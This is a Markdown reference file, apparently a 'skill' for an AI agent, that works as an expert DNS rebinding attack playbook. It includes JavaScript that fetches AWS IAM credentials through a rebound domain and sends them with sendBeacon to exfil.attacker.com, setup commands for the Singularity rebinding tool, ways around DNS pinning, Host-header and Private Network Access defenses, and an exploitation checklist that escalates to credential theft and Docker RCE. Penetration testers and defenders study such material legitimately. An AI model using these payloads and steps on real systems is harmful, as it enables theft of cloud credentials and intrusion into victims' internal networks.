# SKILL: DNS Rebinding — Expert Attack Playbook: detailed technique reference

<!-- zhiyugo:resource:start -->
> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
<!-- zhiyugo:resource:end -->

<!-- zhiyugo:toc:start -->
## Contents

- [4. HIGH-VALUE TARGETS](#4-high-value-targets)
- [5. TOOLS](#5-tools)
- [6. DNS REBINDING vs. SSRF](#6-dns-rebinding-vs-ssrf)
- [7. DEFENSES AND DEFENSE BYPASS](#7-defenses-and-defense-bypass)
- [8. DECISION TREE](#8-decision-tree)
- [9. REAL-WORLD EXPLOITATION CHECKLIST](#9-real-world-exploitation-checklist)
<!-- zhiyugo:toc:end -->

## 4. HIGH-VALUE TARGETS

| Target | Port | Why |
|---|---|---|
| Cloud metadata | `169.254.169.254:80` | AWS/GCP/Azure instance credentials, tokens |
| Docker API | `172.17.0.1:2375` | Container creation, host filesystem mount → RCE |
| Kubernetes API | `10.96.0.1:443/6443` | Pod creation, secret reading |
| Internal admin panels | Various | Router config, NAS, printer, SCADA |
| IoT devices | `192.168.x.x:80/443` | Camera feeds, smart home control |
| Elasticsearch | `*:9200` | Data exfiltration, index manipulation |
| Redis | `*:6379` | Data read, config set for RCE |
| Consul/etcd | `*:8500/2379` | Service discovery, secret storage |

### Cloud metadata specific

```javascript
// AWS metadata via rebinding
fetch('http://attacker.com/latest/meta-data/iam/security-credentials/')
    .then(r => r.text())
    .then(role => {
        return fetch(`http://attacker.com/latest/meta-data/iam/security-credentials/${role}`);
    })
    .then(r => r.json())
    .then(creds => {
        navigator.sendBeacon('https://exfil.attacker.com/', JSON.stringify(creds));
    });
// After rebinding, attacker.com resolves to 169.254.169.254
// Browser sends Host: attacker.com but IMDSv1 doesn't check Host header
```

**IMDSv2 defense**: requires `X-aws-ec2-metadata-token` header from PUT request. Rebinding cannot easily set custom headers on the initial token request in `no-cors` mode.

---

## 5. TOOLS

| Tool | Purpose | URL |
|---|---|---|
| **Singularity** | Full DNS rebinding attack framework | github.com/nccgroup/singularity |
| **rbndr.us** | Quick rebind DNS service (IP pair in subdomain) | rbndr.us |
| **whonow** | Dynamic DNS rebinding server | github.com/taviso/whonow |
| **dnsrebinder** | Minimal Python DNS server for rebinding | Custom / various repos |

### Singularity quick start

```bash
# Clone and run
git clone https://github.com/nccgroup/singularity
cd singularity
go build -o singularity cmd/singularity-server/main.go

# Start with rebind from attacker IP to target IP
./singularity -DNSRebindStrategy round-robin \
    -ResponseIPAddr 1.2.3.4 \
    -RebindingFn sequential \
    -ResponseReboundIPAddr 192.168.1.1
```

### rbndr.us (zero-setup)

```
Format: <hex-ip1>.<hex-ip2>.rbndr.us
Example: 7f000001.c0a80101.rbndr.us
  → alternates between 127.0.0.1 and 192.168.1.1
  
Convert IP to hex:
  192.168.1.1 → c0.a8.01.01 → c0a80101
  127.0.0.1   → 7f.00.00.01 → 7f000001
```

---

## 6. DNS REBINDING vs. SSRF

| Aspect | DNS Rebinding | SSRF |
|---|---|---|
| Execution context | Client-side (browser) | Server-side |
| Origin bypass | Same-origin policy | Network access controls |
| Attacker controls | DNS resolution | URL/request sent by server |
| Requires | Victim visits attacker page | Vulnerable server-side fetch |
| Internal access via | Browser on victim's network | Server's network position |
| Credential inclusion | Browser cookies auto-included | No user credentials |
| Protocol support | HTTP/WS (browser-limited) | Any protocol (gopher, file, etc.) |

**Critical difference**: DNS rebinding leverages the **victim's browser** as the pivot point, so it accesses services visible from the **victim's network**, with the **victim's cookies/credentials**.

---

## 7. DEFENSES AND DEFENSE BYPASS

### Common defenses

| Defense | How it works |
|---|---|
| DNS pinning | Browser/resolver caches DNS and refuses re-resolution |
| Host header validation | Server rejects requests with unexpected Host header |
| Network segmentation | Internal services not reachable from browser network |
| Private network access (PNA) | Chrome's proposal: preflight for requests to private IPs |
| Authentication on internal services | Internal services require auth, not just network access |

### Defense bypass techniques

```
DNS pinning bypass:
├── Multiple A records → connection failure forces fallback
├── Subdomain per request → no cache hit
├── Wait for cache expiry (Chrome: 60s)
└── Rebind via CNAME chain (harder to pin)

Host header validation bypass:
├── Internal service may not check Host header at all
├── Host: attacker.com accepted by default configs
├── IP-based vhosts don't check Host
└── Wildcard vhost configurations

Private Network Access (PNA) bypass:
├── PNA only in Chrome (as of 2024), partial enforcement
├── WebSocket connections may not trigger preflight
├── HTTPS → HTTP downgrade scenarios
└── Non-browser clients unaffected
```

---

## 8. DECISION TREE

```
Want to access internal services from victim's browser?
│
├── Can you get victim to visit your page?
│   ├── YES → DNS rebinding is viable
│   │   │
│   │   ├── What is the target?
│   │   │   ├── HTTP service → Classic rebinding (Section 3.1)
│   │   │   ├── WebSocket service → WS rebinding (Section 3.2)
│   │   │   └── Cloud metadata → Metadata exfil (Section 4)
│   │   │
│   │   ├── Browser cache concern?
│   │   │   ├── Chrome → Wait 60s or use multiple subdomains
│   │   │   ├── Firefox → Wait 60s or adjust dnsCacheExpiration
│   │   │   └── Use multiple A records technique for instant rebind
│   │   │
│   │   ├── Target checks Host header?
│   │   │   ├── YES → Rebinding alone won't work
│   │   │   │   └── Check for SSRF instead (../ssrf-server-side-request-forgery/)
│   │   │   └── NO → Proceed with rebinding
│   │   │
│   │   └── Need credentials?
│   │       ├── Browser auto-sends cookies → works if same-site allows
│   │       └── Custom auth header needed → limited (no-cors won't send custom headers)
│   │
│   └── NO → DNS rebinding not applicable
│       └── Consider SSRF if server-side fetch exists
│
└── Is this server-side DNS validation bypass? (TOCTOU)
    ├── YES → Hybrid approach (Section 3.3)
    │   └── SSRF with DNS rebinding for IP validation bypass
    └── NO → Review ../ssrf-server-side-request-forgery/ instead
```

---

## 9. REAL-WORLD EXPLOITATION CHECKLIST

```
□ Set up DNS rebinding infrastructure (Singularity / rbndr.us / custom)
□ Identify target internal services (port scan from victim context if possible)
□ Determine browser DNS cache duration for target browser
□ Choose rebinding variant (classic / multi-A / subdomain flood)
□ Test with benign internal endpoint first (e.g., / on router)
□ Verify same-origin read works after rebind
□ Escalate: cloud metadata → creds, Docker API → RCE, admin panels → config
□ Document: attacker.com DNS config, JS payload, rebind timing, exfil data
```
